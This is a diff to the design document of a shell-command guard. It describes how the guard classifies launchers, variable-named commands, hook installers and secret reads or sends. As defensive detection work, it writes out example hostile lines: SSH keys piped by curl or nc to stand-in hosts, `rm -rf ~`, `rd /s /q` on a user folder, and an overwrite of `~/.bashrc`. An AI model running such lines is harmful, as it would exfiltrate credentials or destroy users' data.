@@ -162,6 +162,12 @@ parsers are tree-sitter's bash, PowerShell and batch grammars.
   folder in a name with no quotes (`C:\Windows/System32/shutdown.exe`)
   may end it or not, so both are read. One inside the quotes is part of
   the path.
+- cmd reads a `^"` outside double quotes as a quote character that opens no
+  quoted text, and the grammar as a quote that does, so the grammar is
+  handed the line with each such quote written as a letter, the same
+  length, and the words are read from the line as written: `echo ^" & echo
+  x & echo ^"` is three commands. A `^^` is a caret, so a quote after it is
+  a quote.
 - The batch grammar reads an `if` or a `for` only at the start of a line:
   after `&&`, `||` or `|` it is a command named `if` with its condition and
   body as arguments. The guard splits that command's text again on its own,
@@ -607,13 +613,90 @@ each with the options it reads and those of them that take a value, as
   `parallel` is `sem` too with `--semaphore`, or an option that starts
   semaphore mode as it does (`--id`, `--semaphorename`, `--st`,
   `--semaphoretimeout`, `--bg`, `--wait`, and `--fg` without `--tmux`).
+- Windows' console hosts and runners, from any shell: `conhost` (its
+  options compare without case, a handle such as `0x4` among them, and
+  `--` ends them), Windows Terminal's `wt` (each `new-tab`/`nt` and
+  `split-pane`/`sp`, and the command written with neither, runs the
+  command line after its options, in the folder `-d`/`--startingDirectory`
+  names; a `;` word sets the commands apart, each judged, and the
+  subcommands that only move the focus or a pane run none), Sysinternals'
+  `psexec` and `PsExec64` and their kin `paexec` (after a `\\COMPUTER` or
+  `@FILE`, also after the options, options with `-` or `/` in any case,
+  `-w DIR` the folder, `-i`
+  taking a session only when a number follows; they run the program through
+  a service they install, so as an administrator: `elevated`), `gsudo` (its
+  own options, `-i`/`--integrity`, `-u`/`--user` and `--loglevel` taking a
+  value), NirSoft's `nircmd` and `nircmdc` (`exec SHOW PROGRAM…`, `exec2
+  SHOW FOLDER PROGRAM…`, `elevate` and `runassystem` run a program, `execmd
+  …` a line of cmd, `elevatecmd …` and `cmdwait MS …` a command of its own),
+  `pcalua -a PROGRAM -c ARGS -d FOLDER` (the program and its arguments read
+  as a line of cmd, `-c` running to pcalua's next option; a library it is
+  given, `-a x.dll`, is `unknown`, "runs code from a library") and `rundll32`'s functions that start the program after
+  them (shell32's `ShellExec_RunDLL`, url's `FileProtocolHandler`, zipfldr's
+  `RouteTheCall`); any other function of `rundll32` is native code the guard
+  does not read, `unknown`, "runs code from a library" (but
+  `user32.dll,LockWorkStation`, which PowerShell hands on as two words).
+  `mshta` given a file on this machine's disk runs the workspace's own
+  application, as a script file is; given one on another machine (`http:`,
+  `https:`, `ftp:`, a share) a script it downloads, `run_downloaded`; and
+  given any other scheme (`vbscript:`, `javascript:`, `about:`, `file:`,
+  `res:`, `mhtml:`) code the guard does not read, `unknown`. nircmd's own
+  commands that change the registry (`regdelkey`, `regdelval`,
+  `regsetval`), delete a file (`filldelete`) or shut the computer down
+  (`exitwin`) are those findings. Windows' own `sudo` reads as `sudo` does. PowerShell's
+  `Invoke-WmiMethod` and `Invoke-CimMethod` of `Create` on `Win32_Process`
+  start the command line they are given, as `wmic process call create`
+  does: `unknown`, "starts a program through WMI".
+- On POSIX systems, from any shell but cmd: `toybox` runs its applet as
+  `busybox` does; the queues `tsp` (task-spooler; an option that acts on
+  the queue, `-l`, `-t`, `-k` and the like, runs none) and `nq` run the
+  command after their options later; `dbus-launch`, `dbus-run-session`,
+  `xvfb-run`, `tini` and `dumb-init` run it on a bus, a display or as an
+  init; `runuser` (`-c` a shell line, as `su -c`, also among the words
+  after `--`, which it hands the shell; with `-u` the command after the
+  options), `sg GROUP [-c] CMD` (a shell line; words a shell reads back as
+  they are are the program and its arguments), `setpriv`,
+  `numactl`, `cgexec`, `capsh` (the words after `--` handed to bash, or to
+  the shell `--shell=` names; `==` runs capsh again), `gosu`, `su-exec`,
+  runit's `chpst` (`-C DIR` starts it in `DIR`; `-/ ROOT` in a file system
+  rooted elsewhere, read as bubblewrap's is) and daemontools' `setuidgid`,
+  `envuidgid`, `envdir`, `softlimit`, `setlock` and `pgrphack` run it as
+  another user or with other limits; `flatpak-spawn` (`--directory` the
+  folder), `distrobox enter … -- CMD` and `toolbox run CMD`, whose
+  containers share the home directory, run it there; and the terminal
+  emulators (`xterm`, `uxterm`, `urxvt`, `rxvt`, `st`, `alacritty`,
+  `konsole`, `gnome-terminal`, `mate-terminal`, `xfce4-terminal`,
+  `terminator`, `tilix`, `lxterminal`, `sakura`, `qterminal`,
+  `terminology`, `x-terminal-emulator`, `kgx`, `ptyxis`, `cool-retro-term`,
+  `guake`, `eterm`, `aterm`) run the words after `-x`, `--execute` or `--`
+  as a program, and after `-e`, `--command`, `--exec` or
+  `--execute-command` the words or the one word as a line, since terminals
+  differ there (xterm and alacritty take the words, gnome-terminal and
+  xfce4-terminal a line), both judged.
+- What runs code the line does not show: `fc` without `-l` runs again, or
+  edits and runs, commands of the shell's history, and so do zsh's and
+  ksh's `r` and PowerShell's `Invoke-History` (`r`, `ihy`); `fc.exe`,
+  Windows' file compare, is no builtin: `unknown`, "runs commands from the shell's
+  history". A library `LD_PRELOAD`, `LD_AUDIT` or macOS's
+  `DYLD_INSERT_LIBRARIES` names (set in front of the program, with `env`
+  or exported) is loaded into every program the line starts, but a builtin
+  that starts none: `unknown`, "loads a library into the program"; an empty
+  value loads none, and a search path (`LD_LIBRARY_PATH`) is not one.
+  `history -w FILE` and `history -a FILE` write the file.
+  `sudo -e` (`--edit`) and `sudoedit` edit their operands as root, each a
+  write ("edits"), and run the editor their variables name, not a program
+  the operands name.
 
 An option one of `nix run`, `nix shell`, `nix develop`, `nix-shell`,
-`limactl shell`, `doppler run` or `sem` does not know may take the word
-after it as its value, so where the command starts, or what it is, is not
-known: `Unreadable`, `runs a command after an option that cannot be read`
-(`nix develop --frobnicate x -c ls`, `limactl shell --frobnicate default
-ls`, `doppler run --frobnicate x rm -rf ~`). One before the subcommand
+`limactl shell`, `doppler run`, `sem` or a launcher above that reads a
+table of its own options (`conhost`, `wt`, `psexec`, `gsudo`, `tsp`, `nq`,
+`dbus-launch`, `dbus-run-session`, `runuser`, `setpriv`, `numactl`,
+`cgexec`, `dumb-init`, `flatpak-spawn`, `toolbox run`) does not know may
+take the word after it as its value, so where the command
+starts, or what it is, is not known: `Unreadable`, `runs a command after
+an option that cannot be read` (`nix develop --frobnicate x -c ls`,
+`limactl shell --frobnicate default ls`, `doppler run --frobnicate x rm
+-rf ~`, `conhost --frobnicate cmd /c rd /s /q C:\Users\me`). One before the subcommand
 (`nix --frobnicate x develop -c ls`, `limactl --frobnicate shell …`, `doppler
 --frobnicate x run …`) is read the same when a subcommand that runs a command
 follows it, since the option may be what takes the word; otherwise the
@@ -808,6 +891,83 @@ the guard reads again as a statement of its own (`ver && if …`, `i^f`,
 `call call`, a line with the `'VBS` marker) counts against the same budget.
 Past either, the line is unreadable.
 
+**A command a variable or an option names** is run by the program beside
+what it does itself, and is read as a line of the shell the program hands
+it to and judged by every rule, as `rsync -e` and `man -P` are. git runs
+every one through `sh`, on Windows too (Git for Windows ships one), and so
+do the POSIX tools ported there (rsync, less, man and the rest); the
+others (`ssh`, `gh`, `aws`, `kubectl`, `bat`, `svn`, `hg`, `rg`) run
+it through the system's shell, `sh` on a POSIX line and cmd on a Windows
+one. A value that names a program run with no shell is read as a line of
+that one word.
+
+- Variables, set in front of the program, with `env`, `export` (also a
+  plain assignment exported later, `X=…; export X`), PowerShell's `$env:`
+  and cmd's `set` (the name in any case there, as Windows reads it): git's
+  `GIT_SSH_COMMAND`, `GIT_SSH` (a program), `GIT_PAGER`, `PAGER`,
+  `GIT_EDITOR`, `GIT_SEQUENCE_EDITOR`, `VISUAL`, `EDITOR`,
+  `GIT_EXTERNAL_DIFF`, `GIT_ASKPASS`, `SSH_ASKPASS` and
+  `GIT_PROXY_COMMAND`; rsync's `RSYNC_RSH` and `RSYNC_CONNECT_PROG`;
+  less's `LESSOPEN` and `LESSCLOSE` (the line after the `|`, `||` or `-`
+  that say how less reads it); man's `MANPAGER`, `PAGER` and `BROWSER`;
+  `VISUAL` and `EDITOR` for `crontab`, `vipw` and `vigr`, and with
+  `SUDO_EDITOR` for `visudo` and `sudoedit`; `SYSTEMD_PAGER` and `PAGER`
+  for systemd's tools (`journalctl`, `loginctl`, `busctl` and the rest),
+  with `SYSTEMD_EDITOR`, `EDITOR` and `VISUAL` for `systemctl`;
+  `SSH_ASKPASS` for OpenSSH's programs and `ssh-add`; `GH_PAGER`, `PAGER`,
+  `GH_EDITOR`, `VISUAL`, `EDITOR`, `GH_BROWSER` and `BROWSER` for `gh`;
+  `AWS_PAGER` and `PAGER` for `aws`; `KUBE_EDITOR` and `EDITOR` for
+  `kubectl`; `BAT_PAGER` and `PAGER` for `bat`; `SVN_EDITOR`, `VISUAL`,
+  `EDITOR` and `SVN_SSH` for `svn`; `HGEDITOR`, `VISUAL`, `EDITOR`,
+  `HGMERGE` and `PAGER` for `hg`. `psql`'s (`PAGER`, `EDITOR` and the rest,
+  under [Data in a database](#data-in-a-database)) are read on Windows
+  lines too. An empty value names no command. A variable that names a file
+  of settings (`GIT_CONFIG_GLOBAL`), a folder of programs
+  (`GIT_EXEC_PATH`) or the program's own options (`LESS`, `MANOPT`,
+  `TAR_OPTIONS`) is not one of them, nor is a variable a program reads only
+  when a person presses a key (less's `v` and its `EDITOR`).
+- Options: OpenSSH's `-o` settings `ProxyCommand`, `LocalCommand` and
+  `KnownHostsCommand` (the key in any case, its value after `=` or white
+  space, `none` running nothing; read after the host too, where OpenSSH
+  reads options as well) for `ssh`, `scp`, `sftp`, `autossh` and
+  `ssh-copy-id`, and among `sshfs -o`'s comma-separated options with its
+  `ssh_command`; `scp -S` and `sftp -S` (a program), `sftp -D` and `mosh
+  --ssh`; git's `rebase -x`
+  (`--exec`), `bisect run`, `grep -O` (`--open-files-in-pager`), `difftool
+  -x` (`--extcmd`), `clone -u` and the `--upload-pack` of `clone`,
+  `fetch`, `pull`, `ls-remote` and `archive`, the `--receive-pack` of
+  `push` and `send-pack`, and `send-email`'s `--sendmail-cmd`,
+  `--to-cmd`, `--cc-cmd`, `--header-cmd` and a `--smtp-server` that is a
+  program's path, a long one by any prefix of its
+  name, as git takes it; GNU `sort --compress-program` (a program, by any
+  prefix that names it alone); `less` started with `+!CMD`, also after
+  other commands (`+G!CMD`), or `+|mCMD`;
+  `rg --pre` and `--hostname-bin` (a program); and `fd -x` (`--exec`) and
+  `-X` (`--exec-batch`), whose command, the words after the option up to a
+  `;`, is judged as written, each placeholder (`{}`, `{/}`, `{//}`, `{.}`,
+  `{/.}`) a path only known when it runs, put after the words when none is
+  written (`fd -x rm -rf` deletes a path only known when it runs).
+
+`git clone -c KEY=VALUE` (`--config`) is read as `git -c` is, since the
+clone already uses the config it sets (`core.sshCommand`). A library
+OpenSSH is told to load (`ssh -I LIB`, the `PKCS11Provider` and
+`SecurityKeyProvider` settings) is native code the guard does not read:
+`unknown`, "loads a library into the program". PowerShell's `$env:NAME =
+$null` removes the variable, and names no command.
+
+A value only known when it runs (`GIT_SSH_COMMAND="$cmd" git fetch`,
+`GIT_SSH_COMMAND="ssh -i $key" git fetch`, whose value the shell the
+program starts reads again, `ssh -o "ProxyCommand=$x" host`) is `unknown`,
+"runs a command only known when it runs"; an ssh setting only known when it
+runs is one unless its key is written out and is none of those three. The
+line sets a variable once and may run it at many programs (`export
+GIT_SSH_COMMAND=…; git fetch; git fetch; …`), each a reading of the whole
+value, so those readings share the budget of `npm_config_call`'s (the
+longest line), each counted as 64 bytes at the least, since a short one is
+a parse of its own; and one program is read with at most 64 values its
+variables were given. Past either, the line is unreadable, "runs the
+command a variable sets too many times to read".
+
 The other limits, each read as unreadable past it, and each pinned by a test
 that finds the edge by measuring it and asserts both sides (see Tests):
 
@@ -821,6 +981,7 @@ that finds the edge by measuring it and asserts both sides (see Tests):
 | `find -exec` work | 1 MiB | each level runs its program once per place it searches, so levels multiply; counted in the bytes built to hand on, `{}` replaced, because a count of arguments misses one that holds thousands of `{}` |
 | Jobs `parallel` runs | 256 | each a line built from the command and a value of each source, judged one by one |
 | Sources of values to `parallel` | 32 | each job holds a value of each `:::`, `::::` or `-a` |
+| Values the variables of one program are given | 64 | each value a command the program may run (`GIT_PAGER`, `EDITOR`, `LESSOPEN`), read where the program runs; with the readings of what variables name counted against the longest line, 64 bytes at the least for each (see [A command a variable or an option names](#wrappers-and-scripts)) |
 | Lines `parallel` builds | 64 KiB | the jobs' lines together are one script, read no further than the longest line, so built no further; a value put in at each of thousands of `{}` is megabytes otherwise |
 | Brackets opened with none closed | 400 | counted before parsing, outside the literals below: `(` in every shell, `${` in a POSIX shell (where any other `{` may be a word) and `{`, `${` and `[` in PowerShell, each kind closed only by its own closer, all added up. Past the parse tree depth the line is unreadable whatever the grammar makes of it, and the grammars take long to find that out: cmd's time grows with the square of the depth, PowerShell's lexer reads on to the next `}` at every `${` (`${` repeated took 21 ms on one machine, stopped by the budget of what a lexer reads, and 3.4 s on a slower one), and the grammars recover from an error at each bracket (at the length limit, in POSIX `a${` 0.28 s, `${a` 0.26 s, `${` 0.17 s; in PowerShell `$a{` 0.9 s, `${a}{` 0.8 s, `$[` 0.1 s) |
 | `&`, and `|`, in cmd | 400 of each (`&&` and `||` once) | counted before parsing, outside a string: cmd's grammar nests a chain a level for each, so past the parse tree depth the line is unreadable anyway, and for `&` it takes time that grows with the square of the chain to find that out (a chain of 7,280 commands took 1.6 s on one machine and 2.5 s on another) |
@@ -3718,8 +3879,16 @@ directory. On Windows, Git Bash's mount (`/`) is read in a POSIX shell's line
 written from `/` (`cat /c/Users/me/.ssh/id_rsa`) or climbing above the drive
 (`cat ../../../../../c/Users/me/.ssh/id_rsa`); PowerShell and cmd spell a
 drive as Windows does, so a mount changes none of theirs. Without a mount or
-a Windows home, every line is judged as it was. The cases are in
-`tests/cases/drives.cases`.
+a Windows home, every line is judged as it was. On a Windows machine (the
+working directory on a drive), a POSIX word that starts with a drive and a
+separator is the Windows path, mount or none, as Git Bash, MSYS2 and Cygwin
+open it and hand it on, for every rule that places a path, and so is a path
+in the inline code of such a line. On a POSIX
+machine it is a relative name, as it was. Git Bash hands a word that starts
+with `//` to a Windows program with one `/` off, so `cmd //c` is `cmd /c`.
+What is left: with the directories spelled as Git Bash spells them (`/c/…`),
+a word `C:/…` is still read as a relative name, and `scp C:/x host:` reads
+`C:` as scp's host. The cases are in `tests/cases/drives.cases`.
 
 The links the caller has resolved are its to pass too, and core's to read
 ([Core](core.md#links)); a line is judged on each of
@@ -3763,7 +3932,16 @@ plain name there is looked up in full. Without a link named, every line is
 judged as it was. The cases are in `tests/cases/resolved_links.cases`.
 
 - `~` is the home directory. `~user` is another user's, which the spelling
-  does not say, so it is unknown.
+  does not say, so it is unknown. `~+` is `$PWD`, and read as `$PWD` is: the
+  working directory (`cat ~+/../../.ssh/id_rsa` reads the home directory's
+  key), or a folder only known when it runs after a `cd` the guard cannot
+  follow.
+- A `~` the shell leaves as it is, quoted or escaped (`cat "~/../.env"`,
+  `\~/x`, `'~'/x`, `$'~'/x`), hands the program a name in the working
+  directory (`./~/../.env`, the workspace's `.env`); a program that expands
+  `~` itself reads the home directory. Each is judged, in an argument and in
+  a redirect, and so is a path the inline code opens with a `~`, which Python
+  and JavaScript do not expand either.
 - `$HOME`, `%USERPROFILE%` and `$env:TEMP` are the places they name.
 - A PowerShell word that is a variable and a path (`$HOME\.agent\config.yaml`,
   `$env:USERPROFILE/x`, `${HOME}\x`) is an expandable string. The grammar
@@ -4004,6 +4182,8 @@ judged as it was. The cases are in `tests/cases/resolved_links.cases`.
   PowerShell, on the drive the working directory is on, it is relative to it;
   on any other drive it is outside the workspace. After a `cd` it is unknown,
   except that after `cd C:` a relative path is `C:x`, a path on that drive.
+  The working directory's drive is read through a long path's prefix, as core
+  reads it: from `\\?\C:\Users\me\repo` (or `//?/C:/…`) the line is on `C:`.
   cmd keeps a working directory for every drive and the line never shows where
   each one is, so in cmd three rules hold:
   - `cd` and `chdir` without `/d` to a path on another drive set that drive's
@@ -4107,8 +4287,19 @@ path is `overwrite`, and a file in the workspace stays safe. A program the
 guard does not know is not judged as a writer; these are the ones it knows.
 
 - **`curl.exe` and `wget.exe` in PowerShell** are read as `curl` and `wget`
-  are in the other shells (`-o`, `-O`, `--output`, `-P`): a bare `curl` or
-  `wget` there is `Invoke-WebRequest`, judged by its `-OutFile`.
+  are in the other shells (`-o`, `-O`, `--output`, `-P`, and curl's
+  `--output-dir`, the folder its files land in): a bare `curl` or `wget`
+  there is `Invoke-WebRequest`, judged by its `-OutFile`.
+- **A copy from another machine** writes where it lands on this one, as
+  `cp` and `rsync` do: `scp` and `sftp` from `host:path`, `rclone` (`copy`,
+  `copyto`, `sync`, `move`, `moveto`, `copyurl`) from a remote's
+  `name:path`, `aws s3`, `gsutil` and `gcloud storage` (`cp`, `mv`,
+  `sync`, `rsync`) from a bucket: `scp host:x ~/.ssh/authorized_keys` and
+  `aws s3 cp s3://b/k ~/.bashrc` are `overwrite`. A destination on another
+  machine is a send, the send rule's.
+- **`aria2c`** writes its `-o` in its `-d` folder, **HTTPie** and **xh**
+  their `-o` (`--output`), **`bitsadmin /transfer`** the local name after
+  each URL, and **`Start-BitsTransfer`** its `-Destination`.
 - **`certutil`**: `-urlcache` downloads its URL to each operand after it, and
   with `-split` and no file to the URL's name in the folder the line is in
   (`cd /d C:\Windows & certutil -urlcache -split -f URL/a.dll`);
@@ -4251,6 +4442,27 @@ folder itself, or into a folder that is not named like the first names of a
 place on the list, can replace one below it;
 `mv dir .github` renames a folder onto a name that holds one.
 
+A program that installs a git hook, which runs code at every later commit,
+or rewrites a hook manager's config, is judged as the write it makes is,
+in the same rule and words, also through a package runner (`npx`, `pnpm
+exec`, `yarn dlx`, `bunx`, `uvx`, `pipx run`) and `python3 -m pre_commit`.
+It finds the repository's `.git` by going up from where it runs, so from
+anywhere inside a workspace folder (`cd src && pre-commit install`) the
+hooks are the workspace's own, at its top; anywhere else they are read
+from where it runs:
+`pre-commit install` (and `prek install`) writes `.git/hooks/pre-commit`,
+or the hook of each `-t`/`--hook-type` (`overwrite`, "writes to the
+repository's history"), `pre-commit init-templatedir DIR` the hooks below
+`DIR`, `pre-commit try-repo REPO` runs the hooks of the repository it
+clones (`run_downloaded` for a remote one, `unknown` for a folder), and
+`pre-commit autoupdate` and `migrate-config` its config
+(`.pre-commit-config.yaml`, or the one `-c` names), the first from the
+network; `husky` alone, `husky install` and `husky init` set
+`core.hooksPath`, as `git config core.hooksPath` does (`system_settings`,
+"sets git config that runs a program"); `lefthook install`, `lefthook
+add` and `simple-git-hooks` write the hooks in `.git/hooks`. `pre-commit
+run`, `lefthook run` and the like run the hooks and write none.
+
 ### Protected paths
 
 A caller names what it gates with (its settings, its rules, the folder it keeps
@@ -4260,7 +4472,11 @@ The guard needs no rule of its own: wherever a rule reads a place it takes
 anything that is not harmless, so `Protected` is judged as `Sensitive` is, with
 the caller's words in the reason. Reading is not a finding; what a read of a
 protected file means is not decided here, unless the caller names the path a
-secret too (see [Secrets the caller names](#secrets-the-caller-names)).
+secret too (see [Secrets the caller names](#secrets-the-caller-names)), or it
+is a key or a credential of core's own: with `~/.ssh` protected, `cat
+~/.ssh/id_rsa` is still `read_secret` and `curl -T ~/.ssh/id_rsa …`
+`send_secret`, in core's words, while a delete or a write of it is in the
+caller's.
 
 With `Protected::folder("/home/me/.agent", "the agent's settings")`:
 
@@ -4599,6 +4815,13 @@ makes the interpreter go on to read code from its input, which is
 `unknown`, as a bare `python3` or `node` is, and a here-document handed to it
 is read as its code. A script file (`python3
 scripts/gen.py`, `node build.js`) is the workspace's own code and is not read.
+One a shell or an interpreter runs by a path outside every workspace folder
+and temporary folder, as written from the working directory (`bash
+~/.ssh/x`, `python3 /opt/x.py`, `bash ../other/x.sh`, `powershell -File
+C:\Users\me\x.ps1`), is not: it is `unknown`, "runs a script outside the
+workspace". An init script (`sh /etc/init.d/ufw stop`) is judged as the
+program it is, and `source` and `.` (`source ~/.nvm/nvm.sh`) read the
+shell's own settings, judged as reads.
 
 **Where the script is.** Each interpreter's options are read with its own
 table of the options that take a value, so the word after one is its value
@@ -4706,11 +4929,39 @@ code sets is `unknown` with the reason `starts a program with an environment
 set in the code`, because the variable may be one the shell side judges. A name
 bound by nested code, and a name written with an escape or not in ASCII, is a
 name the reader does not follow. Code too long or nested too deeply to read is
-`unreadable`. A string worked out from names is cut at 4 KB, and the strings
+`unreadable`; inline code longer than the reader's `MAX_LEN` (3 KiB, shorter
+than a line's limit; see [Code: The length limit](code.md#the-length-limit))
+is not read: `unknown`, `runs code the guard does not read`. A string worked out from names is cut at 4 KB, and the strings
 noted for all names together and the paths read out of them are bounded, so a
 few hundred bytes cannot take seconds: a name that went over a limit is dropped,
 not read as any string, and a read of it is `unknown`, so no limit makes a line
-safe.
+safe. Every reading of the line's inline code, and of the code that code
+runs inside it (read again for each `Code` act, and to see whether it moves
+the code's folder), draws from one `Budget` of the reader's, made for the
+line's length at the first reading and counted without a clock (see
+[Code: Limits](code.md#limits)), so nesting does not multiply the work: code
+nested in four `eval`s costs what the line's length allows, and so does code
+given in many pieces, each read whole within the bounds of its one parse: the
+budget adds up what each piece's parse cost where no count of that parse sees
+it.
+Each question asked of the same piece is answered from the one tree the
+budget keeps for it. Past it the reading is stopped and the code is not
+read, whatever it is given with (`-c`, `-e`, its input, a here-document),
+and so is every piece of the line read
+after it: `unknown`, `runs code the guard does not read`, and the effect is
+unknown, with what the line does beside it kept. JavaScript the grammar reads
+two ways at once, code nested past the depth the reader walks, a lexer that
+goes over the same text again and again, and a chain of calls named again
+from each link are stopped so. Inline code with a
+syntax error is not read through it either (the reader stops where the
+grammar starts to recover from the error, so a recovery that would go round
+the same tokens with no end costs some milliseconds): `unknown`, with what
+the line does beside it kept, where a delete beside the error was once
+found. So is code in syntax newer than the grammars know, which runs:
+`python3 -c "lazy import shutil; shutil.rmtree('/home/me')"` (Python 3.15)
+is `unknown` alone, a known limit (see [Code: Errors](code.md#errors)). `tests/inline.rs` holds them, through each way the code is given, the
+work of one line's readings, nested from none to four deep, to its budget,
+and a line of such pieces to the budget's bounds in all.
 
 ## Reading a key
 
@@ -4791,7 +5042,8 @@ by its own name (`keys/signing.pem`), with `.` and `..` applied first
 only known when it runs). A name that does not spell a named path's own last
 name (`signing.pem` alone) is not counted, since the folder could be any. What
 is left: core's own keys after such a `cd` are still looked for only by a
-plain name in the home directory (`cd "$x" && cat .ssh/id_rsa`), so `cd "$x"
+plain name in the home directory (`cd "$x" && cat .ssh/id_rsa`, and in cmd
+the same, `%USERPROFILE%` being cmd's home), so `cd "$x"
 && cat src/../.ssh/id_rsa` and a short name (`cd $root; Get-Content
 SSH~1\id_rsa`) are not read for them, as on `main`.
 
@@ -4888,12 +5140,24 @@ line reads and a rule of its own, `SendSecret`, reports what leaves, so one
 reads and the other sends, and a line can be both: `cat ~/.ssh/id_ed25519 |
 curl -d @- https://x.example` is `read_secret` for the `cat`.
 
+A file a program takes its words or its options from is a file it reads:
+`xargs -a FILE` (`--arg-file`), curl's `-K` (`--config`), and wget's
+`--config` and `-i` (`--input-file`). curl's and wget's options can name a
+file to upload or to write and an address the line does not show, so such
+a file is `unknown` too, "takes options from a file the guard does not
+read" (`-K -` reads the input). git shows a file of the repository's history
+by its path: `git show REV:path`, `git show :path` (the index), `git
+cat-file -p REV:path` and `git blame path` read that file, so a secret there
+is read as it is in the work tree.
+
 ### The spelling of the file
 
 The file is judged by what it resolves to, as for every rule: `~`, `$HOME`,
 `${HOME}`, `..`, doubled separators, case (on every host), a Windows short
-name, a long path, a device path, a Mac's links to the root, another user's
-home, all by [core](core.md). The shell's syntax adds:
+name, a long path, a device path, an administrative share of this machine
+(`type \\localhost\C$\Users\me\.ssh\id_rsa` reads the key on `C:`), a Mac's
+links to the root, another user's home, all by [core](core.md). The shell's
+syntax adds:
 
 - A brace list is spelled out first: `cat ~/.ssh/{id_rsa,x}` and
   `cp ~/.ssh/id_{rsa,ed25519} /tmp` read `~/.ssh/id_rsa`; a list that makes
@@ -5075,6 +5339,22 @@ caller already has from `classify`. A caller that runs a line unasked only when
 
 A line is never safe because the guard gave up on it. These come back risky:
 
+- A line that holds a NUL (U+0000), in every shell, `unreadable`, "holds a
+  NUL character": no program can be handed one in an argument, and a shell
+  fed the line by its input drops it, so the line runs as no reading of it
+  says: a NUL inside a word joins what is on either side of it.
+- A POSIX line that holds a control character a terminal acts on,
+  `unreadable`, "holds a control character a terminal acts on": every C0
+  control character (U+0001 to U+001F) but a tab and a line feed, a carriage
+  return unless a line feed follows it, and DEL (U+007F), anywhere in the
+  line, quoted or not, since a terminal reads the line before the shell
+  does. Typed into a terminal, `\x15` drops what came before it on the
+  line, `\x08` and DEL erase, `\x17` erases a
+  word, `\x03` and `\x1a` stop the command, `\x04` ends the input, `\x16`
+  quotes the next character, a lone `\r` ends the line, and `\x1b` starts
+  the keys an editing shell reads. Only the caller's line is read so; a
+  script it hands a shell is not typed. PowerShell and cmd lines are read
+  as they are (a lone `\r` there is already unreadable).
 - A program or script known only when it runs: `$CMD`, `eval "$x"`, `trap "$x" EXIT`, `iex $s`,
   `-EncodedCommand`.
 - Code handed to an interpreter that is not read: Ruby, Perl (beyond
@@ -5768,7 +6048,11 @@ dist .` packs `dist`.
   (when another of its addresses is a network one: `TCP:`, `UDP:`,
   `OPENSSL:`, `SOCKS:` and the like), the attachments of `mail`, `mailx`,
   `s-nail`, `mutt` and `neomutt` (`-a`, `-A`, `--attach`), `gh gist create`
-  (its files, or its input with none or `-`), `az storage blob upload -f`,
+  (its files, or its input with none or `-`), `gh release upload` and
+  `release create` (the assets after the tag, a `#label` off each), the
+  file of `gh`'s `-F`, `--notes-file` and `--body-file` (a release, an
+  issue, a pull request, a comment or a review), `gh api --input FILE` and
+  `-F key=@FILE`, `az storage blob upload -f`,
   and an `sftp` batch: the files its `put`, `reput` and `mput` lines name,
   split into words with sftp's quotes and backslashes (`put ".env"`), read
   from its input (a here-string, an ANSI-C one included, a here-document,
@@ -5928,6 +6212,16 @@ past four, its two oldest are kept as one range of units, from the start of
 the first to the end of the second, which also holds whatever the line runs
 between them, so a call of the name may be judged with more than it runs and
 flagged for it.
+
+Every sender reads its words as the program is handed them, as the read
+rule does: a brace list the shell spells out is each word it makes (`scp
+~/.ssh/id_rsa{,.pub} host:`, `rclone copy ~/.ssh/{id_rsa,x} remote:`; curl
+reads `-T`'s own lists, see above), a `for` over words written out puts
+each word in place of its variable (`for f in ~/.ssh/id_rsa x; do scp "$f"
+host:; done`, and `cat "$f" | nc host 80` in its body), and a Windows name
+the spelling does not settle (a trailing space or dot, a `::$DATA` stream)
+is the file it is a name of. A quoted brace list is read as a list too, as the read
+rule reads it.
 
 Not read, so the caller has to account for them: a PowerShell variable set
 by a name only known when it runs (`Set-Variable $n …`), or set or read
@@ -7052,7 +7346,14 @@ hidden folder. A pattern that picks a secret, or goes below one, is `Beyond`; a
 deep read of a pattern that picks a folder holding one is too. In PowerShell
 and cmd a wildcard with a recursion is a filter on every folder below the one
 it starts in. A part that starts with a dot and matches `..` (`.*`, `.?`)
-reads the folder above as well, in the shells whose patterns match it.
+reads the folder above as well, in the shells whose patterns match it. A
+pattern is `Workspace` only when the folder it starts in, before its first
+wildcard, is inside a workspace folder: one that starts above it picks the
+other projects there too, so `cat ~/work/*/.env`, `cat ../*/.git/config`
+and `Get-Content ~\dev\*\.env` are `Beyond` whatever their last name is,
+though the most serious name they can pick (a hidden one, which may be
+`.git`) is the workspace's own history, while `cat */.env` and `cat
+~/work/repo/*/.env` stay `Workspace`.
 
 What a line reads is also judged by what a place is *to the workspace*, which
 core's place does not say: a protected path or a startup file is the
@@ -7213,7 +7514,14 @@ the workspace, and `effect_paths` lists it like any other.
   pattern keeps them too: the folder a pattern expands in is a path the shell
   opens (`link/../*.rs` is the folder `link/..` and `*.rs`), and a `..` in the
   rest of the pattern is the pattern's own, as written.
-- **Sorted, each entry once**, so the answer is the same every time.
+- **Sorted, each entry once**, so the answer is the same every time and on
+  every host: a path is compared, ordered and kept by its parts as the system
+  it is spelled for splits it (a Windows path at `\` and `/`, any other at
+  `/` alone, where a `\` is a letter of a name: `cat 'a\b' a/b` lists both),
+  then by how it is read, never by the host's own `Path` rules. A last name
+  and an extension the guard reads from a word (a `.py` file `uv run` hands
+  to Python, a file `bun run` runs) are read the same way, by the rules of
+  the shell the line is for.
 - **No path, not listed.** A read that is not a place on a disk has no path:
   the null device and other devices, a registry hive or another PowerShell
   drive, and a path on another drive's own working directory (`D:x` from `C:`).
@@ -7222,7 +7530,8 @@ the workspace, and `effect_paths` lists it like any other.
 - **`Beyond` lines are listed too**, with every read, not only the one that
   made it `Beyond`.
 - **Over-listing** is on the safe side: `cat '~/x'` lists the home folder's `x`
-  (the guard reads the quoted `~` as home), `cat 0< x` lists a path `0`, and a
+  and the working directory's `~/x` (the guard reads the quoted `~` both
+  ways), `cat 0< x` lists a path `0`, and a
   git revision is listed as a path (`HEAD~1`).
 
 `effect` costs what it did: the paths are collected only when `effect_paths`
@@ -7253,7 +7562,10 @@ when it runs, is `Unknown`.
   program. `file -C` writes. `less -o`, `less -O` and `--log-file` write, `less -k`
   reads a lesskey file (whose `#env` section can set `LESSOPEN`), and an
   argument that starts with `+` is a `less` command. `rg --pre`, `rg
-  --hostname-bin` and `rg -z` run a program; `fd -x` and `fd -X` run one.
+  --hostname-bin` and `rg -z` run a program; `fd -x` and `fd -X` run one,
+  a unit of its own, judged as one as `find -exec`'s are (`fd -x wc -l`
+  is still `Unknown` for `fd`, `fd -x rm` changes), and so is the shell
+  command a `less` `+!` names (`less +'!rm x' f` changes).
   `printf -v NAME` sets a variable. All the others in the first group have no
   flag that writes or runs anything.
